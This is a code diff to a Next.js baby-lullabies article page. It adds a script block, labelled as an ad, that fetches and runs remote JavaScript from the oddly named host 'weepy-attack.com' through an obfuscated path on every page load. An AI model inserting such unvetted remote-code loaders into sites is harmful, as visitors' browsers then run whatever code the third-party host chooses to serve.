@@ -4,6 +4,7 @@ import Head from "next/head";
 import Header from "../components/header"; // adjust path if needed
 import Footer from "../components/Footer";
 import Link from "next/link";
+import Script from "next/script";
 
 export default function BestBabyLullabies() {
   return (
@@ -19,7 +20,20 @@ export default function BestBabyLullabies() {
           content="Discover the 10 best lullabies to help your baby sleep peacefully. Soothing songs and tips for calming your newborn and promoting healthy sleep."
         />
       </Head>
-
+      <Script id="custom-ad-script" strategy="afterInteractive">
+        {`
+          (function(xlu){
+            var d = document,
+                s = d.createElement('script'),
+                l = d.scripts[d.scripts.length - 1];
+            s.settings = xlu || {};
+            s.src = "//weepy-attack.com/b.XPVqsBdWGtl/0yYfWccv/eekmi9HuaZ_UslHk_PuTcYT2/MBzMQi3eNuTLAztINmjpYTzQNnDjci1pMYQg";
+            s.async = true;
+            s.referrerPolicy = 'no-referrer-when-downgrade';
+            l.parentNode.insertBefore(s, l);
+          })({})
+        `}
+      </Script>
       <div className="max-w-4xl mx-auto px-4 py-12">
         <nav className="flex items-center space-x-2 text-sm text-gray-500 mb-6">
           <Link href="/" className="hover:text-orange-500 transition-colors duration-200">
